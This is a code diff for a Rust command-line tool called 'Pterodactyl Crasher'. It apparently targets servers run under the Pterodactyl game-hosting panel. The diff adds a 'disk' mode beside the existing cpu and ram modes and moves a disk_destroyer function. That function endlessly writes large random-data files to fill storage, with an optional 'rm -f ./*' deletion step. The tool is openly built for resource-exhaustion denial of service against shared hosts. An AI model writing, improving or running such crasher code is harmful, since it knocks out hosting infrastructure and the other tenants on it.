@@ -8,17 +8,17 @@ use rand::Rng;
 fn help() {
     print!("\x1B[0;34m");
     print!(r#"
-                                    |        |Pterodactyl Crasher|      |
-                                    |            By Alexsuper           |
-                                    |               1.0.0               |
+                                        |        |Pterodactyl Crasher|      |
+                                        |            By Alexsuper           |
+                                        |               1.1.0               |
 
-                                                    |Args|
+                                                        |Args|
 
 crasher (-h | --help) - Printing this help message
-crasher (-m | --mode) (cpu | ram) - Selecting mode cpu or ram
+crasher (-m | --mode) (cpu | ram | disk) - Selecting mode cpu or ram
 crasher (-t | --threads) (number: u32) - Number of threads to work
 crasher (-s | --sleep) (time: u32) - milliseconds to sleep after allocation or calculation
-crasher (-p | --power) (power: u128) - (mode - ram power is allocattion size in mb | mode - cpu power is difficulty of calculation )
+crasher (-p | --power) (power: u128) - (mode - ram power is allocattion size in mb | mode - cpu power is difficulty of calculation | mode - disk weight of file )
 "#)
 }
 
@@ -64,6 +64,46 @@ fn cpu_eater(number: u32, power: u128, sleep: u32) {
         }
         thread::sleep(Duration::from_millis(sleep as u64));
     }
+}
+
+fn disk_destroyer(number: u32, power: u128, sleep: u32) {
+    println!("Started disk destroyer number {}", number);
+    println!("Enable auto deleting");
+    print!("[y]es / [n]o >");
+    std::io::stdout().flush().expect("Could not flush stdout");
+    let mut auto_delete = String::new();
+    std::io::stdin().read_line(&mut auto_delete).expect("Failed to read line");
+    let mut file_count: u32 = 0;
+    loop {
+        let filename = rand::rng().sample_iter(&Alphanumeric).take(16).map(|x| x.to_string()).collect::<String>();
+        let path = std::env::current_dir().expect("Failed to get current directory").join("destroy").join(filename);
+        if !std::env::current_dir().expect("Failed to get current directory").join("destroy").exists() {
+            std::fs::create_dir(std::env::current_dir().expect("Failed to get current directory").join("destroy")).expect("Failed to create directory");
+        }
+        let src = (0..power * 1024 * 1024).map(|_| rand::random::<u8>()).collect::<Vec<u8>>();
+
+        match std::fs::File::create(&path) {
+            Ok(mut file) => {
+                let random_data = src.clone();
+                if let Err(e) = file.write_all(&random_data) {
+                    eprintln!("Failed to write file: {}", e);
+                    break;
+                }
+                println!("Created file: {:?} ({} MB)", path, power);
+                file_count += 1;
+            }
+            Err(e) => {
+                eprintln!("Failed to create file: {}", e);
+                break;
+            }
+        }
+        println!("Files created: {} with size {}", file_count, file_count as u128 * power * 1024 * 1024);
+        if auto_delete.to_lowercase() == "y" || auto_delete.to_lowercase() == "yes" {
+            std::process::Command::new("rm -f ./*").spawn().expect("Failed to remove file");
+        }
+        thread::sleep(Duration::from_millis(sleep as u64));
+    }
+    println!("Files created: {} with size {}", file_count, file_count as u128 * power * 1024 * 1024);
 }
 
 #[tokio::main]
@@ -149,44 +189,4 @@ async fn main() {
         }
         thread::park();
     }
-}
-
-fn disk_destroyer(number: u32, power: u128, sleep: u32) {
-    println!("Started disk destroyer number {}", number);
-    println!("Enable auto deleting");
-    print!("[y]es / [n]o >");
-    std::io::stdout().flush().expect("Could not flush stdout");
-    let mut auto_delete = String::new();
-    std::io::stdin().read_line(&mut auto_delete).expect("Failed to read line");
-    let mut file_count: u32 = 0;
-    loop {
-        let filename = rand::rng().sample_iter(&Alphanumeric).take(16).map(|x| x.to_string()).collect::<String>();
-        let path = std::env::current_dir().expect("Failed to get current directory").join("destroy").join(filename);
-        if !std::env::current_dir().expect("Failed to get current directory").join("destroy").exists() {
-            std::fs::create_dir(std::env::current_dir().expect("Failed to get current directory").join("destroy")).expect("Failed to create directory");
-        }
-        let src = (0..power * 1024 * 1024).map(|_| rand::random::<u8>()).collect::<Vec<u8>>();
-
-        match std::fs::File::create(&path) {
-            Ok(mut file) => {
-                let random_data = src.clone();
-                if let Err(e) = file.write_all(&random_data) {
-                    eprintln!("Failed to write file: {}", e);
-                    break;
-                }
-                println!("Created file: {:?} ({} MB)", path, power);
-                file_count += 1;
-            }
-            Err(e) => {
-                eprintln!("Failed to create file: {}", e);
-                break;
-            }
-        }
-        println!("Files created: {} with size {}", file_count, file_count as u128 * power * 1024 * 1024);
-        if auto_delete.to_lowercase() == "y" || auto_delete.to_lowercase() == "yes" {
-            std::process::Command::new("rm -f ./*").spawn().expect("Failed to remove file");
-        }
-        thread::sleep(Duration::from_millis(sleep as u64));
-    }
-    println!("Files created: {} with size {}", file_count, file_count as u128 * power * 1024 * 1024);
 }
